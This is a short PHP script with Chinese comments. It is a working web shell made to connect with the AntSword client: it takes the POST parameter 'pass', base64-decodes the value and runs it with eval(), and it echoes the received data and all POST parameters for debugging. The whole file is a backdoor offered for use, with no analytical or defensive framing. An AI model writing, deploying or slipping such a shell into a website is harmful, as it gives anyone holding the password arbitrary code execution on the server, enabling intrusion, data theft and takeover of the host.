<?php
// 调试模式，生产环境请关闭
error_reporting(E_ALL);
ini_set('display_errors', 1);

// 蚁剑连接密码，这里假设为'pass'
$password = 'pass';

if (isset($_POST[$password])) {
    $data = $_POST[$password];
    echo "接收到的数据: " . $data . "\n";

    // 直接base64解码
    $decoded = base64_decode($data);
    echo "解码后的数据: " . $decoded . "\n";

    // 执行代码
    eval($decoded);
} else {
    echo "错误：未找到参数 '$password'。\n";
    echo "收到的POST参数：";
    print_r($_POST);
}
?>
